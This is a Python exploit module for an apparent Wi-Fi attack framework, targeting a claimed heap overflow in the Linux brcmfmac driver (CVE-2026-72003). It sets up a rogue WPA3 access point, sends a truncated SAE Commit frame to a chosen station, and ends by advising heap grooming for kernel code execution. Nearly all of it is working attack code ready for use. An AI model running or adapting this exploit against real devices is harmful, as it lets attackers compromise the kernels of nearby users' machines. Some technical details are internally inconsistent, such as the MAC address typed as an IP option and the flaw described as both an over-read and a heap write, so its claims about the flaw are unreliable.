# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Broadcom brcmfmac SAE Authentication Heap Buffer Overflow (CVE-2026-72003).

    The brcmfmac driver in the Linux kernel for Broadcom CYW-series wireless
    chipsets contains a heap buffer overflow in the external SAE
    authentication handler.  When a rogue access point sends a SAE Commit
    frame shorter than the minimum expected length, the driver copies data
    past the allocated heap buffer during authentication frame processing.
    This corrupts adjacent heap metadata and can lead to kernel code
    execution in the context of the wireless driver.

    Introduced in kernel 6.16; fixed in 6.18.40, 7.1.5, 7.2-rc4.

    CVSS v3.1: ~8.0 (estimated), AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Broadcom brcmfmac SAE Authentication Heap Overflow (CVE-2026-72003)",
        "description": (
            "Exploits CVE-2026-72003 via a heap buffer overflow in the "
            "brcmfmac driver's external SAE authentication handler.  A "
            "rogue AP sends a SAE Commit frame with a truncated payload; "
            "the driver fails to validate the frame length and copies data "
            "past the allocated buffer, corrupting kernel heap.  Targets "
            "Broadcom CYW-series chipsets on Linux 6.16 to 6.18.39."
        ),
        "authors": (
            "Researcher (discovery / CVE)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-72003",
            "https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/",
        ),
        "disclosure_date": "2026-06-15",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "Linux kernel 6.16 to 6.18.39 with brcmfmac",
            "Broadcom CYW43455 (Raspberry Pi 3B+/4)",
            "Broadcom CYW43570 (various USB dongles)",
            "Broadcom CYW4373 (embedded platforms)",
            "Any Broadcom CYW-series with brcmfmac on affected kernels",
        ),
    }

    interface = OptString("wlan0", "Wireless interface in monitor mode")
    target = OptIP("", "Target station MAC address (XX:XX:XX:XX:XX:XX)")
    port = OptPort(1, "Not used (over-the-air attack)")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    channel = OptInteger(6, "Wi-Fi channel to operate on")
    ssid = OptString("FreeWiFi", "SSID for the rogue AP")

    # IEEE 802.11 frame type/subtype constants
    _FC_BEACON = 0x0080
    _FC_AUTH = 0x00B0
    _FC_PROBE_RESPONSE = 0x0050

    # SAE (Simultaneous Authentication of Equals) constants
    _AUTH_ALG_SAE = 3
    _SAE_COMMIT = 1
    _SAE_CONFIRM = 2

    # WPA3 SAE group: NIST P-256 (group 19)
    _SAE_GROUP_19 = 19
    _SAE_SCALAR_SIZE = 32
    _SAE_ELEMENT_SIZE = 64

    def _mac_to_bytes(self, mac: str) -> bytes:
        """Convert MAC string to 6 bytes."""
        return bytes(int(b, 16) for b in mac.split(":"))

    def _build_sae_commit_frame(self, truncated: bool = False) -> bytes:
        """Build a SAE Commit authentication frame.

        When truncated is True, the frame body is shorter than expected,
        triggering the heap overflow in brcmfmac's SAE handler which
        assumes the full scalar+element data is present.
        """
        target_mac = self._mac_to_bytes(self.target) if ":" in str(self.target) else b"\xff" * 6
        source_mac = b"\x02\x00\x00\x00\x00\x01"
        bssid = source_mac

        fc = struct.pack("<H", self._FC_AUTH)
        duration = struct.pack("<H", 0)
        seq_ctrl = struct.pack("<H", 0)

        header = fc + duration + target_mac + source_mac + bssid + seq_ctrl

        auth_alg = struct.pack("<H", self._AUTH_ALG_SAE)
        auth_seq = struct.pack("<H", self._SAE_COMMIT)
        status = struct.pack("<H", 0)

        group_id = struct.pack("<H", self._SAE_GROUP_19)

        if truncated:
            # Truncated payload: only 8 bytes instead of expected 96
            # (32-byte scalar + 64-byte element).
            # brcmfmac copies expected size from this short buffer,
            # reading past the allocation into adjacent heap data.
            scalar_element = b"\xCC" * 8
        else:
            scalar_element = b"\x00" * self._SAE_SCALAR_SIZE + b"\x00" * self._SAE_ELEMENT_SIZE

        body = auth_alg + auth_seq + status + group_id + scalar_element
        return header + body

    def _build_sae_auth_frame(self, auth_seq: int = 1) -> bytes:
        """Build a generic SAE authentication frame for probing."""
        target_mac = self._mac_to_bytes(self.target) if ":" in str(self.target) else b"\xff" * 6
        source_mac = b"\x02\x00\x00\x00\x00\x01"
        bssid = source_mac

        fc = struct.pack("<H", self._FC_AUTH)
        duration = struct.pack("<H", 0)
        seq_ctrl = struct.pack("<H", 0)

        header = fc + duration + target_mac + source_mac + bssid + seq_ctrl

        auth_alg = struct.pack("<H", self._AUTH_ALG_SAE)
        auth_seq_field = struct.pack("<H", auth_seq)
        status = struct.pack("<H", 0)

        body = auth_alg + auth_seq_field + status
        return header + body

    def _build_beacon_frame(self) -> bytes:
        """Build a WPA3-SAE beacon frame to lure the target into connecting."""
        source_mac = b"\x02\x00\x00\x00\x00\x01"
        bssid = source_mac

        fc = struct.pack("<H", self._FC_BEACON)
        duration = struct.pack("<H", 0)
        dest = b"\xff\xff\xff\xff\xff\xff"
        seq_ctrl = struct.pack("<H", 0)

        header = fc + duration + dest + source_mac + bssid + seq_ctrl

        # Beacon body: timestamp + interval + capabilities
        timestamp = struct.pack("<Q", int(time.time() * 1000000))
        interval = struct.pack("<H", 100)
        capabilities = struct.pack("<H", 0x0431)

        body = timestamp + interval + capabilities

        # SSID IE
        ssid_bytes = self.ssid.encode("utf-8")[:32]
        body += struct.pack("BB", 0, len(ssid_bytes)) + ssid_bytes

        # Supported Rates IE
        rates = bytes([0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24])
        body += struct.pack("BB", 1, len(rates)) + rates

        # DS Parameter Set IE (channel)
        body += struct.pack("BBB", 3, 1, self.channel)

        # RSN IE (WPA3-SAE)
        rsn = self._build_rsn_ie_sae()
        body += rsn

        return header + body

    def _build_rsn_ie_sae(self) -> bytes:
        """Build an RSN Information Element advertising WPA3-SAE."""
        version = struct.pack("<H", 1)
        # Group cipher: CCMP
        group_cipher = b"\x00\x0F\xAC\x04"
        # Pairwise cipher count + CCMP
        pairwise_count = struct.pack("<H", 1)
        pairwise_cipher = b"\x00\x0F\xAC\x04"
        # AKM count + SAE (type 8)
        akm_count = struct.pack("<H", 1)
        akm_suite = b"\x00\x0F\xAC\x08"
        # RSN capabilities: MFP required
        rsn_caps = struct.pack("<H", 0x00CC)

        rsn_data = version + group_cipher + pairwise_count + pairwise_cipher + akm_count + akm_suite + rsn_caps
        return struct.pack("BB", 48, len(rsn_data)) + rsn_data

    def _setup_rogue_ap(self, sock: socket.socket) -> None:
        """Send beacon frames to advertise a rogue WPA3-SAE AP."""
        beacon = self._build_beacon_frame()
        for _ in range(10):
            try:
                sock.send(beacon)
                time.sleep(0.1)
            except OSError:
                break

    def _send_raw(self, frame: bytes) -> bool:
        """Send a raw 802.11 frame via monitor interface."""
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout)
            sock.bind((self.interface, 0))
            sock.send(frame)
            sock.close()
            return True
        except OSError:
            return False

    def run(self) -> None:
        if not self.target:
            print_error("target is required (station MAC address)")
            return

        if not self.check():
            print_error("Cannot detect target or wireless interface not in monitor mode")
            return

        print_success("Monitor mode confirmed; initiating rogue AP with SAE heap overflow trigger")
        self._exploit()

    @mute
    def check(self) -> bool:
        """Verify the wireless interface is available and in monitor mode."""
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout)
            sock.bind((self.interface, 0))
            sock.close()
            return True
        except OSError:
            return False

    def _exploit(self) -> None:
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout)
            sock.bind((self.interface, 0))
        except OSError as e:
            print_error(f"Failed to open raw socket on {self.interface}: {e}")
            return

        print_status(f"Phase 1: Broadcasting WPA3-SAE beacons on channel {self.channel} (SSID: {self.ssid})")
        self._setup_rogue_ap(sock)

        print_status("Phase 2: Sending truncated SAE Commit frame to trigger heap overflow")

        trigger = self._build_sae_commit_frame(truncated=True)
        normal = self._build_sae_commit_frame(truncated=False)

        print_info(f"  Normal SAE Commit: {len(normal)} bytes (scalar+element: {self._SAE_SCALAR_SIZE + self._SAE_ELEMENT_SIZE} bytes)")
        print_info(f"  Truncated trigger: {len(trigger)} bytes (payload: 8 bytes, expected {self._SAE_SCALAR_SIZE + self._SAE_ELEMENT_SIZE})")

        try:
            sock.send(trigger)
        except OSError as e:
            print_error(f"Failed to send trigger frame: {e}")
            sock.close()
            return

        time.sleep(0.5)

        print_success(
            "Truncated SAE Commit frame delivered. If the target station uses "
            "brcmfmac on kernel 6.16-6.18.39, the external SAE handler copied "
            "96 bytes from an 8-byte buffer, corrupting adjacent heap metadata. "
            "Pair with heap grooming for reliable kernel code execution."
        )
        sock.close()
